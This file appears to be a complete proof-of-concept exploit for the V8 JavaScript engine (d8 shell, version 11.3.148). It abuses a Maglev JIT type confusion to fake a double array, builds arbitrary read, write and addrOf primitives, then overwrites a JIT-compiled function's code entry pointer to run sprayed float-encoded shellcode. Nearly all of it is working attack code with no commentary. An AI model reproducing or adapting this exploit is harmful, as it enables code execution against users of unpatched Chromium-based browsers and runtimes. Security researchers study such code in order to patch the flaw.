// out/x64.release/d8 --allow-natives-syntax --future /tmp/exp.js
// commit 3eeca75f1c5ae67026a8fa440d490424ecd8c3e5 (HEAD, tag: 11.3.148-pgo, tag: 11.3.148, origin/11.3.148)

var addrOf_LO = new Array(0x30000);

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}
var helper = new Helpers();
function f(a) {
    let phi = a ? 0 : 4.2;
    phi |= 0;
    a.c = phi;
}
let obj = { c: "a" };
var fake_object_array;
helper.mark_sweep_gc();
helper.mark_sweep_gc();
% PrepareFunctionForOptimization(f);
f(obj);
% OptimizeMaglevOnNextCall(f);
f(obj);

new Array(256);

helper.scavenge_gc();
helper.mark_sweep_gc();

/*
low -> hight
00000000 00000000 | 00000000 00000000 | 0000 0018e979[double-array-map] | 00000219[properties] 00042149[element] | 00060000[length 0x30000] 00060000[useless]
*/
fake_object_array = [0.0, 0.0, 3.4644403541910054e-308, 5.743499907618807e-309, 8.34402697134475e-309];

var fake_array = obj.c; // length 196608

// print("[+] fake_array.length: ", fake_array.length);

function arbRead(where) {
    fake_object_array[3] = helper.pair_i32_to_f64(0x219, where - 8);
    return helper.f64toi64(fake_array[0]);
}

function arbWrite(where, what) {
    fake_object_array[3] = helper.pair_i32_to_f64(0x219, where - 8);
    fake_array[0] = helper.i64tof64(what);
}

function addrOf(object){
    fake_object_array[3] = helper.i64tof64(0x1c214900000219n);
    addrOf_LO[0] = object;
    return helper.ftoil(fake_array[0]);
}

const foo = () => {
    return [
        1.9711828979523134e-246,
        1.9562205631094693e-246,
        1.9557819155246427e-246,
        1.9711824228871598e-246,
        1.971182639857203e-246,
        1.9711829003383248e-246,
        1.9895153920223886e-246,
        1.971182898881177e-246
    ];
}
  
% PrepareFunctionForOptimization(foo);
foo();
% OptimizeFunctionOnNextCall(foo);
foo();

var foo_addr = addrOf(foo);

var code_addr = arbRead(foo_addr + 0x18) & 0xffffffffn

var code_entry_point_addr = arbRead(Number(code_addr) + 0x8);

arbWrite(Number(code_addr) + 0x8, code_entry_point_addr + 0x53n);

foo();

// clean up
// fake_array = null;
// helper.trap();